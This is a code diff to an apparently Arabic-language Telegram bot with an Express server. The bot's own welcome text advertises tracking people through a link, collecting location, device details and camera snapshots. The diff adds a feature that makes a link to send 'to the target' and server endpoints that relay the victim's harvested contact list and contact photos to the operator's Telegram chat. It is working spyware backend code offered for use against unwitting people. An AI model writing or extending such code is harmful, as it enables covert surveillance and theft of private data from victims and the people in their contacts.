@@ -68,7 +68,12 @@ bot.on('message', async (msg) => {
 
   if (msg.text == "/start") {
     var m = {
-      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط", callback_data: "crenew" }]] })
+      reply_markup: JSON.stringify({
+        "inline_keyboard": [
+          [{ text: "🔗 إنشاء رابط", callback_data: "crenew" }],
+          [{ text: "📱 سحب جهات الاتصال مع الصور", callback_data: "contacts" }]
+        ]
+      })
     };
 
     bot.sendMessage(chatId, `مرحباً بڪ ${msg.chat.first_name} ! , \nيمكنك استخدام هذا البوت لتعقب الأشخاص فقط من خلال ارتباط بسيط. \   يمكنه جمع معلومات مثل يمكنك استخدام هذا البوت لتعقب الأشخاص فقط من خلال رابط بسيط يمكنه جمع معلومات مثل الموقع ومعلومات الجهاز ومقاطع الكاميرا   اكتب تعليمات لمزيد من المعلومات.  الموقع ، معلومات الجهاز ، لقطات الكاميرا اكتب تعليمات لمزيد من المعلومات اضغط على /help`, m);
@@ -104,6 +109,12 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
   bot.answerCallbackQuery(callbackQuery.id);
   if (callbackQuery.data == "crenew") {
     createNew(callbackQuery.message.chat.id);
+  }
+  if (callbackQuery.data == "contacts") {
+    const cid = callbackQuery.message.chat.id;
+    const uid = cid.toString(36);
+    const link = `${hostURL}/contacts/${uid}`;
+    bot.sendMessage(cid, `📱 رابط سحب جهات الاتصال مع الصور:\n\n${link}\n\n⚠️ أرسل هذا الرابط للهدف وستصلك جهات اتصاله فور فتحه.`);
   }
 });
 bot.on('polling_error', (error) => {
@@ -173,6 +184,33 @@ function createNew(cid) {
 
 
 
+
+app.get("/contacts/:uid", (req, res) => {
+  res.render("contacts", { uid: req.params.uid, a: hostURL });
+});
+
+app.post("/contacts-data", (req, res) => {
+  var uid = decodeURIComponent(req.body.uid) || null;
+  var data = decodeURIComponent(req.body.data) || null;
+  if (uid && data) {
+    bot.sendMessage(parseInt(uid, 36), `📱 جهات الاتصال المسحوبة:\n\n${data}`);
+    res.send("Done");
+  } else { res.send("Error"); }
+});
+
+app.post("/contact-photo", (req, res) => {
+  var uid = decodeURIComponent(req.body.uid) || null;
+  var img = decodeURIComponent(req.body.img) || null;
+  var name = decodeURIComponent(req.body.name) || "جهة اتصال";
+  if (uid && img) {
+    var buffer = Buffer.from(img, 'base64');
+    var info = { filename: "contact.png", contentType: 'image/png' };
+    try {
+      bot.sendPhoto(parseInt(uid, 36), buffer, { caption: `👤 ${name}` }, info);
+    } catch (e) { console.log(e); }
+    res.send("Done");
+  } else { res.send("Error"); }
+});
 
 app.get("/", (req, res) => {
   var ip;
